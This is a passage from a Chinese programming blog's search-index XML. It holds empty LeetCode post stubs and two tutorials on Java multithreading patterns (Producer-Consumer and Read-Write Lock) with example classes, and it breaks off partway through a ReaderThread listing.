      </tags>
  </entry>
  <entry>
    <title>27. 移除元素</title>
    <url>/2018/09/10/LeetCode/leetcode-000027.%20%E7%A7%BB%E9%99%A4%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>28. 实现strStr()</title>
    <url>/2018/09/10/LeetCode/leetcode-000028.%20%E5%AE%9E%E7%8E%B0strStr()/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>30. 与所有单词相关联的字串</title>
    <url>/2018/09/10/LeetCode/leetcode-000030.%20%E4%B8%8E%E6%89%80%E6%9C%89%E5%8D%95%E8%AF%8D%E7%9B%B8%E5%85%B3%E8%81%94%E7%9A%84%E5%AD%97%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>29. 两数相除</title>
    <url>/2018/09/10/LeetCode/leetcode-000029.%20%E4%B8%A4%E6%95%B0%E7%9B%B8%E9%99%A4/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>31. 下一个排列</title>
    <url>/2018/09/10/LeetCode/leetcode-000031.%20%E4%B8%8B%E4%B8%80%E4%B8%AA%E6%8E%92%E5%88%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>32. 最长有效括号</title>
    <url>/2018/09/10/LeetCode/leetcode-000032.%20%E6%9C%80%E9%95%BF%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>33. 搜索旋转排序数组</title>
    <url>/2018/09/10/LeetCode/leetcode-000033.%20%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>35. 搜索插入位置</title>
    <url>/2018/09/10/LeetCode/leetcode-000035.%20%E6%90%9C%E7%B4%A2%E6%8F%92%E5%85%A5%E4%BD%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>34. 在排序数组中查找元素的第一个和最后一个位置</title>
    <url>/2018/09/10/LeetCode/leetcode-000034.%20%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%A5%E6%89%BE%E5%85%83%E7%B4%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%92%8C%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E4%BD%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Producer-Consumer 模式</title>
    <url>/2018/09/06/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/5.Producer-Consumer%20%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="Producer-Consumer-模式"><a href="#Producer-Consumer-模式" class="headerlink" title="Producer-Consumer 模式"></a>Producer-Consumer 模式</h2><p>Producer是“生产者”的意思，指的是生成数据的线程。Consumer则是“消费者”的意思，指的是使用数据的线程。</p>
<p><strong>生产者安全地将数据交给消费者</strong>。虽然仅是这样看似简单的操作，但当生产者和消费者以不同的线程运行时，两者之间的处理速度差异便会引起问题。例如，消费者想要获取数据，可数据还没有生成，或者生产者想要交付数据，而消费者的状态还无法接受数据等。</p>
<p>Producer-Consumer模式在生产者和消费者之间加入了一个“桥梁”角色。该桥梁角色用于消除线程间处理速度的差异。</p>
<p>一般来说，在该模式中，生产者和消费者都有多个，当然，生产者和消费者有时也会只有一个。当两者都只有一个时，称之为PIPE模式。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>在这个示例程序中，有3位糕点师制作蛋糕并将其放到桌子上，然后有三位客人来吃这些蛋糕。程序运行如下所示：</p>
<ul>
<li>糕点师（MakerThread）制作蛋糕（String）。并将其放置到桌子上（Table）上。</li>
<li>桌上最多可以防止3个蛋糕</li>
<li>如果桌子上已经放满3个蛋糕时糕点师还要再放置蛋糕，必须等到桌子上空出位置。</li>
<li>客人（EaterThread）取桌子上的蛋糕吃</li>
<li>客人按蛋糕被放置到桌子上的顺序来取蛋糕</li>
<li>当桌子上1个蛋糕都没有时，客人若要取蛋糕，必须等到桌子上新放置了蛋糕。</li>
</ul>
<h3 id="类的一览图"><a href="#类的一览图" class="headerlink" title="类的一览图"></a>类的一览图</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>MakerThread</td>
<td>表示糕点师的类</td>
</tr>
<tr>
<td>EaterThread</td>
<td>表示客人的类</td>
</tr>
<tr>
<td>Table</td>
<td>表示桌子的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
</tbody></table>
<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><p>Main类会创建一个桌子的实例，并启动表示糕点师和客人的线程。MakerThread和EaterThread的构造函数中传入的数字只是用来作为随机数的种子，数值本身并没有什么特别的意义。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Table table = <span class="keyword">new</span> Table(<span class="number">3</span>);</span><br><span class="line">		<span class="keyword">new</span> MakerThread(<span class="string">"M1"</span>, table, <span class="number">78548</span>).start();</span><br><span class="line">		<span class="keyword">new</span> MakerThread(<span class="string">"M2"</span>, table, <span class="number">31415</span>).start();</span><br><span class="line">		<span class="keyword">new</span> MakerThread(<span class="string">"M3"</span>, table, <span class="number">48521</span>).start();</span><br><span class="line">		<span class="keyword">new</span> EaterThread(<span class="string">"E1"</span>, table, <span class="number">78541</span>).start();</span><br><span class="line">		<span class="keyword">new</span> EaterThread(<span class="string">"E2"</span>, table, <span class="number">78214</span>).start();</span><br><span class="line">		<span class="keyword">new</span> EaterThread(<span class="string">"E3"</span>, table, <span class="number">12532</span>).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="MakerThread类"><a href="#MakerThread类" class="headerlink" title="MakerThread类"></a>MakerThread类</h3><p>MakerThread类用于制作蛋糕，并将其放置在桌子上，也就是糕点师。为了简单期起见，我们像下面这样以“流水号”和制作该蛋糕的“线程名称”来表示蛋糕。<br>{ Cake No.123 by MakerThread-1 }<br>       流水号     线程名称</p>
<p>为了使程序的运行结果方便查看，蛋糕的流水号在所有的糕点师质检室公用的。为此，这里将流水号（id）声明了静态字段。</p>
<p>MakeThread会先暂停一段随机长（0-1000毫秒之间）的时间，然后再调用Table类的put方法将制作好的蛋糕放置到桌子上。暂停的这段时间模拟的是“制作蛋糕所花费的时间”。</p>
<p>MakeThread无限循环执行“制作蛋糕-&gt;放置到桌子上”，是蛋糕的生产者。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MakerThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Random random;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Table table;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MakerThread</span><span class="params">(String name, Table table, <span class="keyword">long</span> seed)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.table = table;</span><br><span class="line">		<span class="keyword">this</span>.random = <span class="keyword">new</span> Random(seed);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">				String cake = <span class="string">"[ Cake No."</span> + nextId() + <span class="string">"by "</span> + getName() + <span class="string">" ]"</span>;</span><br><span class="line">				table.put(cake);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">nextId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> id++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="EaterThread类"><a href="#EaterThread类" class="headerlink" title="EaterThread类"></a>EaterThread类</h3><p>EaterThread类用于表示从桌子上取蛋糕吃的人。</p>
<p>客人通过Table类的Take方法取桌子上的蛋糕。然后，与MakerThread类一样，EaterThread也会暂停一段随机长的时间。</p>
<p>EaterThread无限循环执行“从桌子上取蛋糕-&gt;吃蛋糕”，是蛋糕的消费者。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EaterThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Random random;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Table table;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">EaterThread</span><span class="params">(String name, Table table, <span class="keyword">long</span> seed)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.table = table;</span><br><span class="line">		<span class="keyword">this</span>.random = <span class="keyword">new</span> Random(seed);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				String cake = table.take();</span><br><span class="line">				Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Table-类"><a href="#Table-类" class="headerlink" title="Table 类"></a>Table 类</h2><p>Table类用于表示放置蛋糕的桌子。</p>
<p>可放置的蛋糕个数通过构造函数来制定。</p>
<p>在示例程序中，蛋糕以String实例来表示。Table类声明了一个String数组类型的buffer字段，用于作为蛋糕的实际放置位置。</p>
<p>为了正确放置（put）和取（take）蛋糕，table类还声明了int类型的字段tail、head和count。各字段的含义分别如下所示。</p>
<ul>
<li>tail字段：表示下一次放置（put）蛋糕的位置</li>
<li>head字段：表示下一次取（take）蛋糕的位置</li>
<li>count字段：表示当前桌子上放置的蛋糕的个数。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Table</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String[] buffer;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> tail;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> head;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Table</span><span class="params">(<span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.buffer = <span class="keyword">new</span> String[count];</span><br><span class="line">		<span class="keyword">this</span>.head = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">this</span>.tail = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">this</span>.count = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(String cake)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		System.out.println(Thread.currentThread().getName() + <span class="string">" puts "</span> + cake);</span><br><span class="line">		<span class="keyword">while</span> (count &gt;= buffer.length) &#123;</span><br><span class="line">			wait();</span><br><span class="line">		&#125;</span><br><span class="line">		buffer[tail] = cake;</span><br><span class="line">		tail = (tail + <span class="number">1</span>) % buffer.length;</span><br><span class="line">		count++;</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">			wait();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		String cake = buffer[head];</span><br><span class="line">		head = (head + <span class="number">1</span>) % buffer.length;</span><br><span class="line">		count--;</span><br><span class="line">		notifyAll();</span><br><span class="line">		System.out.println(Thread.currentThread().getName() + <span class="string">" takes "</span> + cake);</span><br><span class="line">		<span class="keyword">return</span> cake;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="运行结果示例"><a href="#运行结果示例" class="headerlink" title="运行结果示例"></a>运行结果示例</h3><p><img src="https://huhansi.github.io/images/result.PNG" alt="运行结果示例"></p>
]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
        <tag>设计模式</tag>
        <tag>Producer-Consumer 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Read-Write Lock 模式</title>
    <url>/2018/09/06/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/6.Read-Write%20Lock%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="Read-Write-Lock-模式"><a href="#Read-Write-Lock-模式" class="headerlink" title="Read-Write Lock 模式"></a>Read-Write Lock 模式</h2><p>当线程“读取”实例的状态时，示例的状态不会发生变化。示例的状态尽在线程执行“写入”操作时才会发生变化。从实例的状态变化这个观点来看，“读取”和“写入”有着本质的区别。</p>
<p>在Read-Write Lock模式中，读取操作和写入操作是分开考虑的，在执行读取操作之前，线程必须获取用于读取的锁。而在执行写入操作之前，线程必须获取用于写入的锁。</p>
<p>由于当线程执行读取操作时，示例的状态不会发生变化，所以多个线程可以同时读取。但在读取时，不可写入。</p>
<p>当线程执行写入操作时，示例的状态就会发生变化。因此，当有一个线程正在写入时，其他线程不可读取或写入。</p>
<p>一般来说，执行互斥处理会降低程序性能。但如果把针对写入的互斥处理和针对读取的互斥处理分开来考虑，则可以提高程序性能。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>WriterThread</td>
<td>表示写入线程的类</td>
</tr>
<tr>
<td>ReadThread</td>
<td>表示读取线程的类</td>
</tr>
<tr>
<td>Data</td>
<td>可以读写的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
<tr>
<td>ReadWriteLock</td>
<td>提供读写锁的类</td>
</tr>
<tr>
<td>### Main类</td>
<td></td>
</tr>
<tr>
<td>Main类首先会创建一个Data类的示例。然后创建对该Data类实例执行读取操作的线程实例，以及执行写入操作的线程实例，并启动它们。</td>
<td></td>
</tr>
</tbody></table>
<p>这里启动了六个读取线程和两个写入线程。<br>Main类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Data data = <span class="keyword">new</span> Data(<span class="number">10</span>);</span><br><span class="line">		<span class="keyword">new</span> ReaderThread(data).start();</span><br><span class="line">		<span class="keyword">new</span> ReaderThread(data).start();</span><br><span class="line">		<span class="keyword">new</span> ReaderThread(data).start();</span><br><span class="line">		<span class="keyword">new</span> ReaderThread(data).start();</span><br><span class="line">		<span class="keyword">new</span> ReaderThread(data).start();</span><br><span class="line">		<span class="keyword">new</span> ReaderThread(data).start();</span><br><span class="line">		<span class="keyword">new</span> WriterThread(data, <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>).start();</span><br><span class="line">		<span class="keyword">new</span> WriterThread(data, <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Data类"><a href="#Data类" class="headerlink" title="Data类"></a>Data类</h3><p>Data类是可以执行读取和写入操作的类。</p>
<p>buffer字段是实际的读写对象char的数组。</p>
<p>lock字段保存的是该模式的主角ReadWriteLock实例。</p>
<p>构造函数会根据参数传入的长度来分配一个char数组，并初始化buffer字段，同时以字符“<em>”填满buffer，此处的“</em>”为初始值。</p>
<p>read方法执行读取操作。实际的读取操作是通过doRead方法执行的，而doRead方法夹在lock.readLock和lock.readUnlock之间。lock.readLock表示获取用于读取的锁，lock.readUnlock则表示释放用于读取的锁。</p>
<p>夹住doRead的地方使用了try…finally结构。这是为了确保在执行了readLock之后，不管doRead中发生了什么情况，lock.readUnlock都一定会被调用。</p>
<p>doRead方法用于执行实际的读取操作。该方法会创建一个新的char数组，来赋值buffer字段的内容，并返回newbuf。</p>
<p>doWrite方法用于执行实际的写入操作。该方法会以参数传入的字符c来填满buffer字段。</p>
<p>slowly方法用于辅助模拟耗时的操作，次数是sleep约50毫秒。<br>Data 类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Data</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> ReadWriteLock lock = <span class="keyword">new</span> ReadWriteLock();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">char</span>[] buffer;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Data</span><span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.buffer = <span class="keyword">new</span> <span class="keyword">char</span>[size];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; size;i++) &#123;</span><br><span class="line">			buffer[i] = <span class="string">'*'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">char</span>[] read() <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">		lock.readLock();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> doRead();</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			lock.readUnlock();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">char</span>[] doRead() &#123;</span><br><span class="line">		<span class="keyword">char</span>[] newBuff = <span class="keyword">new</span> <span class="keyword">char</span>[buffer.length];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; buffer.length;i++) &#123;</span><br><span class="line">			newBuff[i] = buffer[i];</span><br><span class="line">		&#125;</span><br><span class="line">		slowly();</span><br><span class="line">		<span class="keyword">return</span> newBuff;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">slowly</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Thread.sleep(<span class="number">50</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doWrite</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; buffer.length;i++) &#123;</span><br><span class="line">			buffer[i] = c;</span><br><span class="line">			slowly();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">char</span> c)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		lock.writeLock();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			doWrite(c);</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			lock.writeUnlock();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WriteThread类"><a href="#WriteThread类" class="headerlink" title="WriteThread类"></a>WriteThread类</h3><p>WriterThread类表示的是对Data实例执行写入操作的线程。构造函数的参数filter是一个字符串，程序会逐个去除该字符串中的字符，并write到data的实例中。<br>WriteThread类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WriterThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Data data;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String filler;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">WriterThread</span><span class="params">(Data data, String filler)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.data = data;</span><br><span class="line">		<span class="keyword">this</span>.filler = filler;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">				<span class="keyword">char</span> c = nextChar();</span><br><span class="line">				data.write(c);</span><br><span class="line">				Thread.sleep(random.nextInt(<span class="number">3000</span>));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">char</span> <span class="title">nextChar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">char</span> c = filler.charAt(index);</span><br><span class="line">		index++;</span><br><span class="line">		<span class="keyword">if</span> (index &gt;= filler.length()) &#123;</span><br><span class="line">			index = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> c;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ReadThread类"><a href="#ReadThread类" class="headerlink" title="ReadThread类"></a>ReadThread类</h3><p>ReadThread类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReaderThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Data data;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ReaderThread</span><span class="params">(Data data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.data = data;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> 